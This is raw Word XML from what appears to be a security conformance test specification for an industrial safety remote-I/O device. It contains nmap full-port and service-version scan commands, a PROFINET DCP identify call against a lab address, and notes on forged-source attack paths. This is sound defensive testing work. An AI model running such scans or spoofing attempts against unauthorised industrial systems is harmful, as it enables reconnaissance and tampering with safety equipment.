      <w:tr w:rsidR="0006297D" w:rsidRPr="00AD42B6" w14:paraId="3F2AC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7A2BA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 xml:space="preserve">Abstract </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D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A7943" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="00AD42B6" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Full TCP + top-UDP scan + service/version detection against the DUT; diff vs. design; flag unexpected exposure.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="36304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F7379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DCDE2" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>PASS</w:t>
            </w:r>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iff</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AD42B6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> only design-approved services are exposed (e.g., IoT-Core HTTP; no HTTPS/MQTT/WebSocket). </w:t>
            </w:r>
            <w:r w:rsidRPr="0006297D">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>FAIL</w:t>
            </w:r>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>iff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any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un-approved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service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is</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:lastRenderedPageBreak/>
              <w:t>reachable</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="75AC5303" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0006297D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Level 2 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0006297D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Concrete</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0006297D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0006297D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6105"/>
      </w:tblGrid>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="581C2A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F98755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C9C1C9" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0006297D">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="437D29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D477E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rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Ref</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297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C84BE" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0006297D">
              <w:t>TC-RQ001-04</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="52125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ECFE1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9AF99" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve">DUT IP </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>set</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve"> via DCP </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>to</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve"> 192.168.0.2; Pi eth0 = 192.168.0.100</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0006297D" w:rsidRPr="0006297D" w14:paraId="6429C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957B1" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0006297D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5F9B7" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>Nmap</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve"> (Pi) — ifm </w:t>
            </w:r>
            <w:r w:rsidRPr="0006297D">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>CM-001</w:t>
            </w:r>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve">; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>pnio_dcp</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>for</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0006297D">
              <w:t xml:space="preserve"> L2 </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0006297D">
              <w:t>identify</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="31F2744B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># TC-RQ001-04 Reachability enumeration a connecting device would see</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D642F52" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="00AD42B6" w:rsidRDefault="0006297D" w:rsidP="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>sudo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>sS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>sV</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> -p- -T3 -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>oA</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> TC04_srio_tcp 192.168.0.2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="477840F8" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="00AD42B6" w:rsidRDefault="0006297D" w:rsidP="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>sudo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>sU</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> --top-ports 200 -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>oA</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> TC04_srio_udp 192.168.0.2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B613E50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python3 -c "import </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>pnio_dcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>; print(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>pnio_dcp.DCP</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>('eth0').</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>identify_all</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>())"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CA06333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| </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Expected</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | Open: HTTP :80 (IoT-Core), PROFINET/DCP L2. Absent: 443 (HTTPS), 1883 (MQTT), WebSocket (SRIO-7906/7907). | | </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Result</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | ☐ PASS ☐ FAIL — deviations: ______ | | </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Evidence</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | TC04_srio_tcp.xml/.</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, TC04_srio_udp.xml, DCP identify log | </w:t>
      </w:r>
      <w:hyperlink r:id="rId23" w:history="1">
        <w:r w:rsidRPr="00AD42B6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00AD42B6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00AD42B6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="000A50CE" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D" w:rsidP="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="0006297D">
        <w:pict w14:anchorId="25B77A51">
          <v:rect id="_x0000_i1359" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="26CAA7EF" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="00AD42B6" w:rsidRDefault="0006297D" w:rsidP="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Summary of Changes (vs. my original RQ-001)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47993F09" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="00AD42B6" w:rsidRDefault="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Removed the DoS threat over-reach</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — I had added </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Denial of Service</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> to STRIDE without a backing CR; generalized flooding-DoS resilience is </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-010</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. DoS is now a </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>cross-reference</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, and the watchdog test is reframed as a </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>fail-safe outcome of a connected device disrupting comms</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (the RQ-001 EHSR outcome), not DoS-resilience-in-general.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D14211F" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Removed TS-5 (DCP set/reset flood)</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — it straddles </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-011</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (unauthenticated DCP, now TC-RQ011-02) and </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-010</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (flood). </w:t>
      </w:r>
      <w:r w:rsidRPr="0006297D">
        <w:t>Cross-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0006297D">
        <w:t>referenced</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0006297D">
        <w:t xml:space="preserve"> out.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68478ED5" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="0006297D" w:rsidRDefault="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Kept the RQ-001 core intact</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>CR 3.1(+RE1) + CR 1.2</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">; </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Spoofing + Tampering (+Replay)</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">; </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Assets A, C, F</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">; and the two decisive gaps: </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">G-1 (device-level, testable: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>F_Dest+CRC+watchdog</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">G-2 (environmental: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>F_Source_Add</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> unchecked → firewall assumption, not device-testable)</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:hyperlink r:id="rId24" w:history="1">
        <w:r w:rsidRPr="0006297D">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0006297D">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="0006297D">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="0006297D">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId25" w:history="1">
        <w:r w:rsidRPr="0006297D">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[100_SRIO_P...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0006297D">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="0006297D">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1C3F62CA" w14:textId="77777777" w:rsidR="0006297D" w:rsidRPr="00AD42B6" w:rsidRDefault="0006297D">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Reframed TC-RQ001-03</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> from "Denial of Service / staleness" to**"Connection-Disruption → Safe-State Verification,"** aligning it with RQ-001's outcome-based text and cross-referencing RQ-010 for flooding.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46BD97F4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The corrected verdict is tightly bounded: </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-001 = a connecting/communicating device cannot drive the safety function into a hazardous state</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — mis-addressed, corrupted, or disrupting connections resolve </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>safely</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (G-1 met); a </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>forged-source, valid-CRC</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> connection is stopped only by the </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>firewall assumption</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD42B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (G-2, environmental) — with </w:t>
      </w:r>
